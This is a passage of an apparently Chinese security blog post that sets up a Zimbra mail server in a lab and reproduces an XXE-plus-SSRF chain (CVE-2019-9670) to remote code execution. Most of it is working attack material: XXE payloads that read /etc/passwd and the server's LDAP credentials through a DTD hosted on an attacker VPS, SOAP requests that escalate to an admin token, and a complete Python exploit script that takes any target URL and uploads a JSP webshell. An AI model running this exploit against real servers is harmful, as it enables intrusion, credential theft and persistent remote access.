+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;hostname</span><br><span class="line">更改hostname为自己的域名，例如mail.test.com</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/a2.png" alt=""></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;hosts 添加如下代码</span><br><span class="line">192.168.37.137(本机IP) mail.test.com mail</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/a3.png" alt=""></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;dnsmasq.conf 配置如下</span><br><span class="line"></span><br><span class="line">server&#x3D;192.168.37.137</span><br><span class="line">domain&#x3D;test.com</span><br><span class="line">mx-host&#x3D;test.com, mail.test.com, 5</span><br><span class="line">mx-host&#x3D;mail.test.com, mail.test.com, 5</span><br><span class="line">listen-address&#x3D;127.0.0.1</span><br><span class="line">配置完成后重启电脑，sudo reboot</span><br><span class="line">我这里是把它放在了519行，不过我感觉放哪儿都可以吧，2333</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/a4.png" alt=""><br>
+我已经提前下载好了Zimbra8.5.0版本，直接用finalshell托上去就行<br>
+也可使用命令下载8.6.0版本<br>
+<img src="/imgss/a5.png" alt=""></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;files.zimbra.com&#x2F;downloads&#x2F;8.6.0_GA&#x2F;zcs-8.6.0_GA_1153.UBUNTU14_64.20141215151116.tgz</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/a6.png" alt=""></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd进去之后执行.&#x2F;install然后一路按y，可能会报错</span><br><span class="line">问题不大，删了就行</span><br><span class="line">apt-get remove postfix</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/a7.png" alt=""><br>
+这里不需要zimbra-dnscache，因为我们上边使用的是dnsmasq，所以不需要此包<br>
+之后一路按y即可，安装可能需要些时间<br>
+<img src="/imgss/a8.png" alt=""><br>
+可能会提示配置MX记录，no即可</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DNS ERROR resolving MX for mail.test.com</span><br><span class="line">It is suggested that the domain name have an MX record configured in DNS</span><br><span class="line">Change domain name? [Yes] no</span><br></pre></td></tr></table></figure></div>
+<p>带星号的为必填，设置一下就OK</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">******* +Admin Password                        UNSET</span><br></pre></td></tr></table></figure></div>
+<p>设置好密码之后选25填写许可证，这里随便个/etc/passwd就行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter the name of the file that contains the license: &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*** CONFIGURATION COMPLETE - press &#39;a&#39; to apply</span><br><span class="line">Select from menu, or press &#39;a&#39; to apply config (? - help) a</span><br><span class="line">Save configuration data to a file? [Yes] yes</span><br><span class="line">Save config in file: [&#x2F;opt&#x2F;zimbra&#x2F;config.38577] </span><br><span class="line">Saving config in &#x2F;opt&#x2F;zimbra&#x2F;config.38577...done.</span><br><span class="line">The system will be modified - continue? [No] yes</span><br></pre></td></tr></table></figure></div>
+<p>如果期间报错，直接回车即可<br>
+使用su - zimbra命令切换用户<br>
+zmcontrol status查看zimbra服务器状态<br>
+<img src="/imgss/a9.png" alt=""><br>
+访问IP:7071端口，跳转zimbra管理页面<br>
+<img src="/imgss/a10.png" alt=""></p>
+<h2 id="li-yong-xxe-ssrf-zu-he-quan-rce-fu-xian" id="利用XXE-SSRF组合拳RCE复现">利用XXE+SSRF组合拳RCE复现</h2>
+<h3 id="di-yi-bu-ce-shi-shi-fou-cun-zai-cve-2019-9670-xxe-lou-dong" id="第一步，测试是否存在CVE-2019-9670-XXE漏洞">第一步，测试是否存在CVE-2019-9670 XXE漏洞</h3>
+<p>POST请求/Autodiscover/Autodiscover.xml</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt;</span><br><span class="line"> &lt;Autodiscover xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;exchange&#x2F;autodiscover&#x2F;outlook&#x2F;responseschema&#x2F;2006a&quot;&gt;</span><br><span class="line">    &lt;Request&gt;</span><br><span class="line">      &lt;EMailAddress&gt;aaaaa&lt;&#x2F;EMailAddress&gt;</span><br><span class="line">      &lt;AcceptableResponseSchema&gt;&amp;xxe;&lt;&#x2F;AcceptableResponseSchema&gt;</span><br><span class="line">    &lt;&#x2F;Request&gt;</span><br><span class="line">  &lt;&#x2F;Autodiscover&gt;</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/a11.png" alt=""></p>
+<h3 id="di-er-bu-du-qu-zimbra-yong-hu-zhang-hao-mi-ma" id="第二步，读取zimbra用户账号密码">第二步，读取zimbra用户账号密码</h3>
+<p>成功读到用户密码，说明XXE验证成功<br>
+接下来构造payload读zimbra的配文件localconfig.xml<br>
+由于localconfig.xml为XML文件，需要加上CDATA标签才能作为文本读取，由于XXE不能内部实体进行拼接，所以此处需要使用外部dtd：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:..&#x2F;conf&#x2F;localconfig.xml&quot;&gt;</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY fileContents &#39;%start;%file;%end;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></div>
+<p>POST请求/Autodiscover/Autodiscover.xml</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE Autodiscover [</span><br><span class="line">        &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;公网服务器&#x2F;dtd&quot;&gt;</span><br><span class="line">        %dtd;</span><br><span class="line">        %all;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;Autodiscover xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;exchange&#x2F;autodiscover&#x2F;outlook&#x2F;responseschema&#x2F;2006a&quot;&gt;</span><br><span class="line">    &lt;Request&gt;</span><br><span class="line">        &lt;EMailAddress&gt;aaaaa&lt;&#x2F;EMailAddress&gt;</span><br><span class="line">        &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;&#x2F;AcceptableResponseSchema&gt;</span><br><span class="line">    &lt;&#x2F;Request&gt;</span><br><span class="line">&lt;&#x2F;Autodiscover&gt;</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/a12.png" alt=""></p>
+<h3 id="di-san-bu-li-yong-huo-qu-dao-de-mi-ma-huo-qu-di-quan-xian-token" id="第三步，利用获取到的密码获取低权限token">第三步，利用获取到的密码获取低权限token</h3>
+<p>POST请求/service/soap或/service/admin/soap</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;soap:Envelope xmlns:soap&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2003&#x2F;05&#x2F;soap-envelope&quot;&gt;</span><br><span class="line">   &lt;soap:Header&gt;</span><br><span class="line">       &lt;context xmlns&#x3D;&quot;urn:zimbra&quot;&gt;</span><br><span class="line">           &lt;userAgent name&#x3D;&quot;ZimbraWebClient - SAF3 (Win)&quot; version&#x3D;&quot;5.0.15_GA_2851.RHEL5_64&quot;&#x2F;&gt;</span><br><span class="line">       &lt;&#x2F;context&gt;</span><br><span class="line">   &lt;&#x2F;soap:Header&gt;</span><br><span class="line">   &lt;soap:Body&gt;</span><br><span class="line">     &lt;AuthRequest xmlns&#x3D;&quot;urn:zimbraAccount&quot;&gt;</span><br><span class="line">        &lt;account by&#x3D;&quot;adminName&quot;&gt;zimbra&lt;&#x2F;account&gt;</span><br><span class="line">        &lt;password&gt;上一步得到密码&lt;&#x2F;password&gt;</span><br><span class="line">     &lt;&#x2F;AuthRequest&gt;</span><br><span class="line">   &lt;&#x2F;soap:Body&gt;</span><br><span class="line">&lt;&#x2F;soap:Envelope&gt;</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/a13.png" alt=""></p>
+<h3 id="di-si-bu-li-yong-ssrf-lou-dong-tong-guo-proxy-jie-kou-fang-wen-admin-de-soap-jie-kou-huo-qu-gao-quan-xian-token" id="第四步，利用SSRF漏洞通过proxy接口，访问admin的soap接口获取高权限Token">第四步，利用SSRF漏洞通过proxy接口，访问admin的soap接口获取高权限Token</h3>
+<p>POST请求/service/proxy?target=https://127.0.0.1:7071/service/admin/soap<br>
+我这里可能环境有问题，没有使用SSRF直接请求/service/admin/soap即可获取高权限token</p>
+<p>注意：<br>
+Host:后面加端口7071<br>
+Cookie中设置Key为ZM_ADMIN_AUTH_TOKEN，值为上面请求所获取的token<br>
+发送同上Body内容，但是AuthRequest的xmlns要改为：urn:zimbraAdmin，否则获取的还是普通权限的Token<br>
+<img src="/imgss/a14.png" alt=""></p>
+<h3 id="di-wu-bu-li-yong-gao-quan-xian-token-chuan-wen-jian-getshell" id="第五步，利用高权限token传文件getshell">第五步，利用高权限token传文件getshell</h3>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PY"><figure class="iseeu highlight /py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">file= &#123;</span><br><span class="line"><span class="string">&#x27;filename1&#x27;</span>:(<span class="literal">None</span>,<span class="string">&quot;whocare&quot;</span>,<span class="literal">None</span>),</span><br><span class="line"><span class="string">&#x27;clientFile&#x27;</span>:(<span class="string">&quot;sunian.jsp&quot;</span>,<span class="string">r&#x27;&lt;%                                                                                                                                                                                                                                                                              %&gt;&#x27;</span>,<span class="string">&quot;text/plain&quot;</span>), </span><br><span class="line"><span class="string">&#x27;requestId&#x27;</span>:(<span class="literal">None</span>,<span class="string">&quot;12&quot;</span>,<span class="literal">None</span>),</span><br><span class="line">&#125;</span><br><span class="line">headers =&#123; </span><br><span class="line"><span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;ZM_ADMIN_AUTH_TOKEN=0_eb68a2a147c98c6d0c2257d7638c4f1256493b28_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313539323733343831303035313b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d393a3433323433373532323b&quot;</span>,<span class="comment">#改成自己的admin_token</span></span><br><span class="line"><span class="string">&quot;Host&quot;</span>:<span class="string">&quot;foo:7071&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(<span class="string">&quot;https://192.168.37.137:7071/service/extension/clientUploader/upload&quot;</span>,files=file,headers=headers,verify=<span class="literal">False</span>)    </span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/a15.png" alt=""><br>
+虽然执行报错了，但是不影响<br>
+shell地址：<a target="_blank" rel="noopener" href="https://192.168.37.137:7071/downloads/sunian.jsp">https://192.168.37.137:7071/downloads/sunian.jsp</a><br>
+<img src="/imgss/a16.png" alt=""></p>
+<h3 id="exp-de-bian-xie" id="exp的编写">exp的编写</h3>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PY"><figure class="iseeu highlight /py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">base_url=sys.argv[<span class="number">1</span>]</span><br><span class="line">base_url=base_url.rstrip(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"><span class="comment">#利用request模块来发包和接受数据，sys模块用来传参，并删除最右侧的/斜杠</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;sunian.jsp&quot;</span></span><br><span class="line">fileContent = <span class="string">r&#x27;&lt;%                                                                                                                                                                                                                                                                              %&gt;&#x27;</span></span><br><span class="line"><span class="comment">#fileContent = r&#x27;&lt;%@page import=&quot;java.io.*&quot;%&gt;&lt;%@page import=&quot;sun.misc.BASE64Decoder&quot;%&gt;&lt;%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       %&gt;&#x27;</span></span><br><span class="line"><span class="comment">#可使用第11行bypass</span></span><br><span class="line"><span class="built_in">print</span>(base_url)</span><br><span class="line"><span class="comment">#请自己在公网放置dtd文件</span></span><br><span class="line">dtd_url=<span class="string">&quot;http://VPS-IP/exp.dtd&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;file:../conf/localconfig.xml&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % all &quot;&lt;!ENTITY fileContents &#x27;%start;%file;%end;&#x27;&gt;&quot;&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">xxe_data = <span class="string">r&quot;&quot;&quot;&lt;!DOCTYPE Autodiscover [</span></span><br><span class="line"><span class="string">        &lt;!ENTITY % dtd SYSTEM &quot;&#123;dtd&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">        %dtd;</span></span><br><span class="line"><span class="string">        %all;</span></span><br><span class="line"><span class="string">        ]&gt;</span></span><br><span class="line"><span class="string">&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;Request&gt;</span></span><br><span class="line"><span class="string">        &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;</span></span><br><span class="line"><span class="string">        &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt;</span></span><br><span class="line"><span class="string">    &lt;/Request&gt;</span></span><br><span class="line"><span class="string">&lt;/Autodiscover&gt;&quot;&quot;&quot;</span>.<span class="built_in">format</span>(dtd=dtd_url)</span><br><span class="line"></span><br><span class="line"><span class="comment">#XXE stage</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/xml&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Get User Name/Password By XXE &quot;</span>)</span><br><span class="line">r = requests.post(base_url+<span class="string">&quot;/Autodiscover/Autodiscover.xml&quot;</span>,data=xxe_data,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">15</span>)</span><br><span class="line"><span class="comment">#print r.text</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;response schema not available&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;don&#x27;t have xxe&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#low_token Stage</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">pattern_name = re.<span class="built_in">compile</span>(<span class="string">r&quot;&amp;lt;key name=(\&quot;|&amp;quot;)zimbra_user(\&quot;|&amp;quot;)&amp;gt;\n.*?&amp;lt;value&amp;gt;(.*?)&amp;lt;\/value&amp;gt;&quot;</span>)</span><br><span class="line">pattern_password = re.<span class="built_in">compile</span>(<span class="string">r&quot;&amp;lt;key name=(\&quot;|&amp;quot;)zimbra_ldap_password(\&quot;|&amp;quot;)&amp;gt;\n.*?&amp;lt;value&amp;gt;(.*?)&amp;lt;\/value&amp;gt;&quot;</span>)</span><br><span class="line">username = pattern_name.findall(r.text)[<span class="number">0</span>][<span class="number">2</span>]</span><br><span class="line">password = pattern_password.findall(r.text)[<span class="number">0</span>][<span class="number">2</span>]</span><br><span class="line"><span class="comment">#print(username)</span></span><br><span class="line"><span class="comment">#print(password)</span></span><br><span class="line"></span><br><span class="line">auth_body=<span class="string">&quot;&quot;&quot;&lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;</span></span><br><span class="line"><span class="string">   &lt;soap:Header&gt;</span></span><br><span class="line"><span class="string">       &lt;context xmlns=&quot;urn:zimbra&quot;&gt;</span></span><br><span class="line"><span class="string">           &lt;userAgent name=&quot;ZimbraWebClient - SAF3 (Win)&quot; version=&quot;5.0.15_GA_2851.RHEL5_64&quot;/&gt;</span></span><br><span class="line"><span class="string">       &lt;/context&gt;</span></span><br><span class="line"><span class="string">   &lt;/soap:Header&gt;</span></span><br><span class="line"><span class="string">   &lt;soap:Body&gt;</span></span><br><span class="line"><span class="string">     &lt;AuthRequest xmlns=&quot;&#123;xmlns&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;account by=&quot;adminName&quot;&gt;&#123;username&#125;&lt;/account&gt;</span></span><br><span class="line"><span class="string">        &lt;password&gt;&#123;password&#125;&lt;/password&gt;</span></span><br><span class="line"><span class="string">     &lt;/AuthRequest&gt;</span></span><br><span class="line"><span class="string">   &lt;/soap:Body&gt;</span></span><br><span class="line"><span class="string">&lt;/soap:Envelope&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&quot;[*] Get Low Privilege Auth Token&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#72行路径可能为/service/soap</span></span><br><span class="line">r=requests.post(base_url+<span class="string">&quot;/service/admin/soap&quot;</span>,data=auth_body.<span class="built_in">format</span>(xmlns=<span class="string">&quot;urn:zimbraAccount&quot;</span>,username=username,password=password),verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">pattern_auth_token=re.<span class="built_in">compile</span>(<span class="string">r&quot;&lt;authToken&gt;(.*?)&lt;/authToken&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">low_priv_token = pattern_auth_token.findall(r.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(low_priv_token)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SSRF+Get Admin_Token Stage</span></span><br><span class="line"></span><br><span class="line">headers[<span class="string">&quot;Cookie&quot;</span>]=<span class="string">&quot;ZM_ADMIN_AUTH_TOKEN=&quot;</span>+low_priv_token+<span class="string">&quot;;&quot;</span></span><br><span class="line">headers[<span class="string">&quot;Host&quot;</span>]=<span class="string">&quot;foo:7071&quot;</span></span><br><span class="line"><span class="comment">#print(&quot;[*] Get Admin  Auth Token By SSRF&quot;)</span></span><br><span class="line"><span class="comment">#r = requests.post(base_url+&quot;/service/proxy?target=https://127.0.0.1:7071/service/admin/soap&quot;,data=auth_body.format(xmlns=&quot;urn:zimbraAdmin&quot;,username=username,password=password),headers=headers,verify=False)</span></span><br><span class="line">r = requests.post(base_url+<span class="string">&quot;/service/admin/soap&quot;</span>,data=auth_body.<span class="built_in">format</span>(xmlns=<span class="string">&quot;urn:zimbraAdmin&quot;</span>,username=username,password=password),headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#若86行无法使用请使用85行</span></span><br><span class="line"></span><br><span class="line">admin_token =pattern_auth_token.findall(r.text)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#print(&quot;ADMIN_TOKEN:&quot;+admin_token)</span></span><br><span class="line"></span><br><span class="line">f = &#123;</span><br><span class="line">    <span class="string">&#x27;filename1&#x27;</span>:(<span class="literal">None</span>,<span class="string">&quot;whocare&quot;</span>,<span class="literal">None</span>),</span><br><span class="line">    <span class="string">&#x27;clientFile&#x27;</span>:(filename,fileContent,<span class="string">&quot;text/plain&quot;</span>),</span><br><span class="line">    <span class="string">&#x27;requestId&#x27;</span>:(<span class="literal">None</span>,<span class="string">&quot;12&quot;</span>,<span class="literal">None</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers =&#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;ZM_ADMIN_AUTH_TOKEN=&quot;</span>+admin_token</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 木马地址&quot;</span>)</span><br><span class="line">r = requests.post(base_url+<span class="string">&quot;/service/extension/clientUploader/upload&quot;</span>,files=f,headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#print(r.text)</span></span><br><span class="line"><span class="built_in">print</span>(base_url+<span class="string">&quot;/downloads/&quot;</span>+filename)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&quot;[*] Request Result:&quot;)</span></span><br><span class="line">s = requests.session()</span><br><span class="line">r = s.get(base_url+<span class="string">&quot;/downloads/&quot;</span>+filename,verify=<span class="literal">False</span>,headers=headers)</span><br><span class="line"><span class="comment">#print(r.text)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 管理员cookie&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(headers[<span class="string">&#x27;Cookie&#x27;</span>])</span><br></pre></td></tr></table></figure></div>
+<p>演示exp运行以及不使用cookie访问木马地址的情况<br>
+<img src="/imgss/a17.png" alt=""></p>
+<p>参考链接<br>
+<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/722bc70ff426">https://www.jianshu.com/p/722bc70ff426</a><br>
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40709439/article/details/90136596">https://blog.csdn.net/weixin_40709439/article/details/90136596</a><br>
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41732430/article/details/89054473">https://blog.csdn.net/weixin_41732430/article/details/89054473</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/06/03/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" rel="prev" title="'常用端口利用总结'">
+                  <i class="fa fa-chevron-left"></i> '常用端口利用总结'
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/07/04/WIFI%E5%AE%89%E5%85%A8/" rel="next" title="">
+                   <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
 
 <div class="copyright">
-  
   &copy; 
